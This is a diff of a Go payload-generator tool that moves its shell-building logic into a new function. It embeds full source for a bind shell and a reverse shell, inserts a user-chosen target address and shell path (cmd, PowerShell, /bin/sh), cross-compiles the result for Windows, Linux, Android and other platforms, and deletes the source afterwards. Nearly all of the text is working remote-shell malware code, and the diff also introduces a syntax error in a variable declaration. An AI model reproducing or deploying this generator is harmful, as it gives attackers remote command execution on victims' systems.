@@ -9,12 +9,138 @@ import (
 	"runtime"
 )
 
-var osOption, cmdORpwsh, archvar, bindORrev, tgtvar, shell, outfile, filecreated string
+var osOption, cmdORpwsh, archvar, bindORrev, tgtvar, shell, , namefile, outfile, filecreated string
 
 const (
 	goos   = "GOOS"
 	goarch = "GOARCH"
 )
+
+func genfunc() {
+	namefile := outfile
+	if runtime.GOOS == "windows" {
+		if cmdORpwsh == "powershell" {
+			shell = "C:\\Windows\\SYSWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
+		}
+		if cmdORpwsh == "cmd" {
+			shell = "C:\\Windows\\System32\\cmd.exe"
+		}
+		if osOption == "linux" || osOption == "freebsd" || osOption == "nacl" || osOption == "netbsd" || osOption == "openbsd" || osOption == "plan9" || osOption == "solaris" || osOption == "dragonfly" {
+			shell = "/bin/sh"
+		}
+		if osOption == "android" && archvar == "arm" {
+			shell = "/system/bin/sh"
+		}
+		bindshell := []byte("package main\nimport (\n\t\"log\"\n\t\"net\"\n\t\"os/exec\"\n)\nvar (\n\taddress string\n\tshell string)\nfunc bindShell(network, address, shell string) {\n\tl, err := net.Listen(network, address)\n\tif err != nil {\n\t\tlog.Fatalln(err)\n\t}\n\tdefer l.Close()\n\tfor {\n\t\tconn, _ := l.Accept()\n\t\tgo func(c net.Conn) {\n\t\t\tcmd := exec.Command(shell)\n\t\t\tcmd.Stdin = c\n\t\t\tcmd.Stdout = c\n\t\t\tcmd.Stderr = c\n\t\t\tcmd.Run()\n\t\t\tdefer c.Close()\n\t\t}(conn)\n\t}\n}\n\nfunc main() {\n\tbindShell(\"tcp\", \"" + tgtvar + "\", \"" + shell + "\")\n}")
+		revshell := []byte("package main\n\nimport (\n\t\"net\"\n\t\"os/exec\"\n)\nvar (\n\taddress string\n\tshell string\n)\nfunc reverseShell(network, address, shell string) {\n\tc, _ := net.Dial(network, address)\n\tcmd := exec.Command(shell)\n\tcmd.Stdin = c\n\tcmd.Stdout = c\n\tcmd.Stderr = c\n\tcmd.Run()\n}\nfunc main() {\n\treverseShell(\"tcp\", \"" + tgtvar + "\", \"" + shell + "\")\n}\n")
+		if bindORrev == "reverse" {
+			err := ioutil.WriteFile(namefile+".go", revshell, 0644)
+			if err != nil {
+				fmt.Println("Could not create file")
+			}
+		}
+		if bindORrev == "bind" {
+			err := ioutil.WriteFile(namefile+".go", bindshell, 0644)
+			if err != nil {
+				fmt.Println("Could not create file")
+			}
+		}
+		fmt.Println("Shell file created.")
+		cmd := exec.Command("go", "build", namefile+".go")
+		cmd.Env = os.Environ()
+		cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", goos, osOption))
+		cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", goarch, archvar))
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			fmt.Println("Could not compile")
+			os.Exit(0)
+		}
+		fmt.Printf("%s", out)
+		pwd, err := os.Getwd()
+		if err != nil {
+			fmt.Println(err)
+			os.Exit(1)
+		}
+		filecreated := pwd + "/" + namefile + ".go"
+		err = os.Remove(fmt.Sprintf("%s", filecreated))
+		if err != nil {
+			fmt.Println("Could not remove file")
+		}
+		fmt.Println("Binary Created.")
+		showbin := exec.Command("C:\\Windows\\System32\\cmd.exe", "/c dir")
+		out1, err := showbin.CombinedOutput()
+		if err != nil {
+			fmt.Println("Could not run command.")
+		}
+		fmt.Printf("%s", string(out1))
+		main()
+	} else {
+		if cmdORpwsh == "powershell" {
+			shell = "C:\\\\Windows\\\\SYSWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+		}
+		if cmdORpwsh == "cmd" {
+			shell = "C:\\\\Windows\\\\System32\\\\cmd.exe"
+		}
+		if osOption == "linux" || osOption == "freebsd" || osOption == "nacl" || osOption == "netbsd" || osOption == "openbsd" || osOption == "plan9" || osOption == "solaris" || osOption == "dragonfly" {
+			shell = "/bin/sh"
+		}
+		if osOption == "android" && archvar == "arm" {
+			shell = "/system/bin/sh"
+		}
+		bindshell := []byte("package main\nimport (\n\t\"log\"\n\t\"net\"\n\t\"os/exec\"\n)\nvar (\n\taddress string\n\tshell string)\nfunc bindShell(network, address, shell string) {\n\tl, err := net.Listen(network, address)\n\tif err != nil {\n\t\tlog.Fatalln(err)\n\t}\n\tdefer l.Close()\n\tfor {\n\t\tconn, _ := l.Accept()\n\t\tgo func(c net.Conn) {\n\t\t\tcmd := exec.Command(shell)\n\t\t\tcmd.Stdin = c\n\t\t\tcmd.Stdout = c\n\t\t\tcmd.Stderr = c\n\t\t\tcmd.Run()\n\t\t\tdefer c.Close()\n\t\t}(conn)\n\t}\n}\n\nfunc main() {\n\tbindShell(\"tcp\", \"" + tgtvar + "\", \"" + shell + "\")\n}")
+		revshell := []byte("package main\n\nimport (\n\t\"net\"\n\t\"os/exec\"\n)\nvar (\n\taddress string\n\tshell string\n)\nfunc reverseShell(network, address, shell string) {\n\tc, _ := net.Dial(network, address)\n\tcmd := exec.Command(shell)\n\tcmd.Stdin = c\n\tcmd.Stdout = c\n\tcmd.Stderr = c\n\tcmd.Run()\n}\nfunc main() {\n\treverseShell(\"tcp\", \"" + tgtvar + "\", \"" + shell + "\")\n}\n")
+		if bindORrev == "reverse" {
+			err := ioutil.WriteFile(namefile+".go", revshell, 0644)
+			if err != nil {
+				fmt.Println("Could not create file")
+			}
+		}
+		if bindORrev == "bind" {
+			err := ioutil.WriteFile(namefile+".go", bindshell, 0644)
+			if err != nil {
+				fmt.Println("Could not create file")
+			}
+		}
+		fmt.Println("Shell file created.")
+		cmd1 := exec.Command("go", "build", namefile+".go")
+		cmd1.Env = os.Environ()
+		cmd1.Env = append(cmd1.Env, fmt.Sprintf("%s=%s", goos, osOption))
+		cmd1.Env = append(cmd1.Env, fmt.Sprintf("%s=%s", goarch, archvar))
+		out1, err := cmd1.CombinedOutput()
+		if err != nil {
+			fmt.Println("Could not compile")
+			os.Exit(0)
+		}
+		fmt.Printf("%s", out1)
+		fmt.Println("Binary Created.")
+		if osOption == "windows" {
+			showbin1 := exec.Command("file", namefile+".exe")
+			out2, err := showbin1.CombinedOutput()
+			if err != nil {
+				fmt.Println("Could not run command.")
+			}
+			fmt.Printf("%s", string(out2))
+		} else {
+			showbin2 := exec.Command("file", namefile)
+			out3, err := showbin2.CombinedOutput()
+			if err != nil {
+				fmt.Println("Could not run command.")
+			}
+			fmt.Printf("%s", string(out3))
+		}
+		pwd, err := os.Getwd()
+		if err != nil {
+			fmt.Println(err)
+			os.Exit(1)
+		}
+		filecreated = pwd + "/" + namefile + ".go"
+		err = os.Remove(fmt.Sprintf("%s", filecreated))
+		if err != nil {
+			fmt.Println("Could not remove file")
+		}
+		main()
+	}
+}
 
 func genMenu() {
 	var gen string
@@ -27,131 +153,7 @@ func genMenu() {
 		fmt.Print("\nEnter output filename.\n")
 		fmt.Print(">_: ")
 		fmt.Scan(&outfile)
-		namefile := outfile
-		if runtime.GOOS == "windows" {
-			if cmdORpwsh == "powershell" {
-				shell = "C:\\Windows\\SYSWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
-			}
-			if cmdORpwsh == "cmd" {
-				shell = "C:\\Windows\\System32\\cmd.exe"
-			}
-			if osOption == "linux" || osOption == "freebsd" || osOption == "nacl" || osOption == "netbsd" || osOption == "openbsd" || osOption == "plan9" || osOption == "solaris" || osOption == "dragonfly" {
-				shell = "/bin/sh"
-			}
-			if osOption == "android" && archvar == "arm" {
-				shell = "/system/bin/sh"
-			}
-			bindshell := []byte("package main\nimport (\n\t\"log\"\n\t\"net\"\n\t\"os/exec\"\n)\nvar (\n\taddress string\n\tshell string)\nfunc bindShell(network, address, shell string) {\n\tl, err := net.Listen(network, address)\n\tif err != nil {\n\t\tlog.Fatalln(err)\n\t}\n\tdefer l.Close()\n\tfor {\n\t\tconn, _ := l.Accept()\n\t\tgo func(c net.Conn) {\n\t\t\tcmd := exec.Command(shell)\n\t\t\tcmd.Stdin = c\n\t\t\tcmd.Stdout = c\n\t\t\tcmd.Stderr = c\n\t\t\tcmd.Run()\n\t\t\tdefer c.Close()\n\t\t}(conn)\n\t}\n}\n\nfunc main() {\n\tbindShell(\"tcp\", \"" + tgtvar + "\", \"" + shell + "\")\n}")
-			revshell := []byte("package main\n\nimport (\n\t\"net\"\n\t\"os/exec\"\n)\nvar (\n\taddress string\n\tshell string\n)\nfunc reverseShell(network, address, shell string) {\n\tc, _ := net.Dial(network, address)\n\tcmd := exec.Command(shell)\n\tcmd.Stdin = c\n\tcmd.Stdout = c\n\tcmd.Stderr = c\n\tcmd.Run()\n}\nfunc main() {\n\treverseShell(\"tcp\", \"" + tgtvar + "\", \"" + shell + "\")\n}\n")
-			if bindORrev == "reverse" {
-				err := ioutil.WriteFile(namefile+".go", revshell, 0644)
-				if err != nil {
-					fmt.Println("Could not create file")
-				}
-			}
-			if bindORrev == "bind" {
-				err := ioutil.WriteFile(namefile+".go", bindshell, 0644)
-				if err != nil {
-					fmt.Println("Could not create file")
-				}
-			}
-			fmt.Println("Shell file created.")
-			cmd := exec.Command("go", "build", namefile+".go")
-			cmd.Env = os.Environ()
-			cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", goos, osOption))
-			cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", goarch, archvar))
-			out, err := cmd.CombinedOutput()
-			if err != nil {
-				fmt.Println("Could not compile")
-				os.Exit(0)
-			}
-			fmt.Printf("%s", out)
-			pwd, err := os.Getwd()
-			if err != nil {
-				fmt.Println(err)
-				os.Exit(1)
-			}
-			filecreated := pwd + "/" + namefile + ".go"
-			err = os.Remove(fmt.Sprintf("%s", filecreated))
-			if err != nil {
-				fmt.Println("Could not remove file")
-			}
-			fmt.Println("Binary Created.")
-			showbin := exec.Command("C:\\Windows\\System32\\cmd.exe", "/c dir")
-			out1, err := showbin.CombinedOutput()
-			if err != nil {
-				fmt.Println("Could not run command.")
-			}
-			fmt.Printf("%s", string(out1))
-			main()
-		} else {
-			if cmdORpwsh == "powershell" {
-				shell = "C:\\\\Windows\\\\SYSWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
-			}
-			if cmdORpwsh == "cmd" {
-				shell = "C:\\\\Windows\\\\System32\\\\cmd.exe"
-			}
-			if osOption == "linux" || osOption == "freebsd" || osOption == "nacl" || osOption == "netbsd" || osOption == "openbsd" || osOption == "plan9" || osOption == "solaris" || osOption == "dragonfly" {
-				shell = "/bin/sh"
-			}
-			if osOption == "android" && archvar == "arm" {
-				shell = "/system/bin/sh"
-			}
-			bindshell := []byte("package main\nimport (\n\t\"log\"\n\t\"net\"\n\t\"os/exec\"\n)\nvar (\n\taddress string\n\tshell string)\nfunc bindShell(network, address, shell string) {\n\tl, err := net.Listen(network, address)\n\tif err != nil {\n\t\tlog.Fatalln(err)\n\t}\n\tdefer l.Close()\n\tfor {\n\t\tconn, _ := l.Accept()\n\t\tgo func(c net.Conn) {\n\t\t\tcmd := exec.Command(shell)\n\t\t\tcmd.Stdin = c\n\t\t\tcmd.Stdout = c\n\t\t\tcmd.Stderr = c\n\t\t\tcmd.Run()\n\t\t\tdefer c.Close()\n\t\t}(conn)\n\t}\n}\n\nfunc main() {\n\tbindShell(\"tcp\", \"" + tgtvar + "\", \"" + shell + "\")\n}")
-			revshell := []byte("package main\n\nimport (\n\t\"net\"\n\t\"os/exec\"\n)\nvar (\n\taddress string\n\tshell string\n)\nfunc reverseShell(network, address, shell string) {\n\tc, _ := net.Dial(network, address)\n\tcmd := exec.Command(shell)\n\tcmd.Stdin = c\n\tcmd.Stdout = c\n\tcmd.Stderr = c\n\tcmd.Run()\n}\nfunc main() {\n\treverseShell(\"tcp\", \"" + tgtvar + "\", \"" + shell + "\")\n}\n")
-			if bindORrev == "reverse" {
-				err := ioutil.WriteFile(namefile+".go", revshell, 0644)
-				if err != nil {
-					fmt.Println("Could not create file")
-				}
-			}
-			if bindORrev == "bind" {
-				err := ioutil.WriteFile(namefile+".go", bindshell, 0644)
-				if err != nil {
-					fmt.Println("Could not create file")
-				}
-			}
-
-			fmt.Println("Shell file created.")
-			cmd1 := exec.Command("go", "build", namefile+".go")
-			cmd1.Env = os.Environ()
-			cmd1.Env = append(cmd1.Env, fmt.Sprintf("%s=%s", goos, osOption))
-			cmd1.Env = append(cmd1.Env, fmt.Sprintf("%s=%s", goarch, archvar))
-			out1, err := cmd1.CombinedOutput()
-			if err != nil {
-				fmt.Println("Could not compile")
-				os.Exit(0)
-			}
-			fmt.Printf("%s", out1)
-			fmt.Println("Binary Created.")
-			if osOption == "windows" {
-				showbin1 := exec.Command("file", namefile+".exe")
-				out2, err := showbin1.CombinedOutput()
-				if err != nil {
-					fmt.Println("Could not run command.")
-				}
-				fmt.Printf("%s", string(out2))
-			} else {
-				showbin2 := exec.Command("file", namefile)
-				out3, err := showbin2.CombinedOutput()
-				if err != nil {
-					fmt.Println("Could not run command.")
-				}
-				fmt.Printf("%s", string(out3))
-			}
-
-			pwd, err := os.Getwd()
-			if err != nil {
-				fmt.Println(err)
-				os.Exit(1)
-			}
-			filecreated = pwd + "/" + namefile + ".go"
-			err = os.Remove(fmt.Sprintf("%s", filecreated))
-			if err != nil {
-				fmt.Println("Could not remove file")
-			}
-			main()
-		}
+		genfunc()
 	}
 	if gen == "n" {
 		main()
